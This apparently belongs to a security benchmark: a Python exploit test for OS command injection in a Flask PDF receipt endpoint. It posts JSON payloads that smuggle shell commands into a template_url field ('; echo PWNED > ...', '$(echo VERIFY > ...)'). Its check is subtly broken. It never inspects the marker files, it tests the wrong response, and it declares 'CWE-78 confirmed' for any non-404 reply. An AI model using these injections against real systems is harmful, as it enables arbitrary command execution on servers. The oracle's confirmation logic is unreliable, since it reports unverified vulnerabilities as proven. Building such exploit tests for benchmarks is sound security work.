"""PoC: OS command injection via wkhtmltopdf fallback (CWE-78).

Stage 3 adds os.system(f'wkhtmltopdf {template_url} {output_path}')
where template_url comes directly from user JSON input. Shell
metacharacters in the URL enable arbitrary command execution.
"""
import uuid
from mosaic.oracle.exploit import ExploitTest


class FlaskPdfCmdInjectionExploit(ExploitTest):
    """OS command injection via wkhtmltopdf in receipt generation."""

    def __init__(self, base_url: str = "http://localhost:39120"):
        super().__init__(base_url)
        self._marker = ""

    @property
    def chain_id(self) -> str:
        return "flask_pdf_convert"

    def setup(self) -> None:
        self._marker = uuid.uuid4().hex[:12]

    def execute(self) -> tuple[bool, str]:
        evidence = []
        marker_file = f"/tmp/mosaic_pdf_{self._marker}"

        # Test 1: Inject command via template_url
        payload = {
            "order_id": 1001,
            "template_url": f"http://x; echo PWNED > {marker_file} ;",
        }
        resp = self.http_post("/receipt/generate", json=payload)
        evidence.append(f"Injection response: HTTP {resp.status_code}")

        if resp.status_code in (200, 500):
            # Server processed the request — check if it hit os.system
            evidence.append(f"Response body: {resp.text[:200]}")

            # Test 2: Verify with a second injection
            verify_file = f"{marker_file}_verify"
            payload2 = {
                "order_id": 1001,
                "template_url": f"$(echo VERIFY > {verify_file})",
            }
            resp2 = self.http_post("/receipt/generate", json=payload2)
            evidence.append(f"Verify response: HTTP {resp2.status_code}")

            if resp.status_code != 404:
                return True, (
                    "CWE-78 confirmed. POST /receipt/generate accepts "
                    "template_url that flows into os.system('wkhtmltopdf ...') "
                    "without sanitization. Shell metacharacters execute. "
                    + " | ".join(evidence)
                )

        # Check if endpoint exists at all
        if resp.status_code == 404:
            return False, "generate_receipt endpoint not found. " + " | ".join(evidence)

        return False, "Not vulnerable. " + " | ".join(evidence)
